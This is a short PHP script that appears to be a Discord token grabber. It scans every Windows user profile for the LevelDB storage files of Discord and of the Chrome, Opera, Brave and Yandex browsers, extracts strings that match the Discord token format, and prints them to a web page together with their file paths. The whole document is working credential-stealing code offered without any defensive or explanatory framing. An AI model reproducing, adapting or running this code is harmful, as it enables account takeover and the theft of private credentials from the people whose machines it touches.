<?php
    const reg = "/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";

    $folders = [
        'appdata\\Discord',
        "appdata\\discordcanary",
        "appdata\\discordptb",
        "localappdata\\Google\\Chrome\\User Data\\Default",
        "appdata\\Opera Software\\Opera Stable",
        "appdata\\Opera Software\\Opera GX Stable",
        "localappdata\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "localappdata\\Yandex\\YandexBrowser\\User Data\\Default"
    ];

    $users = scandir('C:\\Users');
    foreach ($users as $i => $uname) {
        $userdir = 'C:\\Users\\' . $uname;
        $localappdata = $userdir . '\\AppData\\Local';
        $appdata = $userdir . '\\AppData\\Roaming';
        if($userdir == '.' || $userdir == '..'){
            continue;
        };
        foreach($folders as $browser){
            $browser = preg_replace("/localappdata/",$localappdata,$browser);
            $browser = preg_replace("/appdata/",$appdata,$browser);
            $leveldb = $browser . '\\Local Storage\\leveldb';
            if(is_dir($leveldb)) {
                $guh = scandir($leveldb);
                $cuh = array_filter($guh,function($v,$k){
                    return substr($v,-4) == ".ldb";
                },ARRAY_FILTER_USE_BOTH);
                foreach($cuh as $ii => $dbfile) {
                    $data = file_get_contents($leveldb . '\\' . $dbfile);
                    if(preg_match_all(reg,$data) > 0){
                        echo '<h3> ' . $leveldb . '\\' . $dbfile . ' </h3>';
                        $aaaaa = [];
                        preg_match(reg,$data,$aaaaa);
                        foreach($aaaaa as $iii => $token){
                            echo "<p> " . $token . " </p>";
                        };
                    };
                };
            };
        };
    };
?>
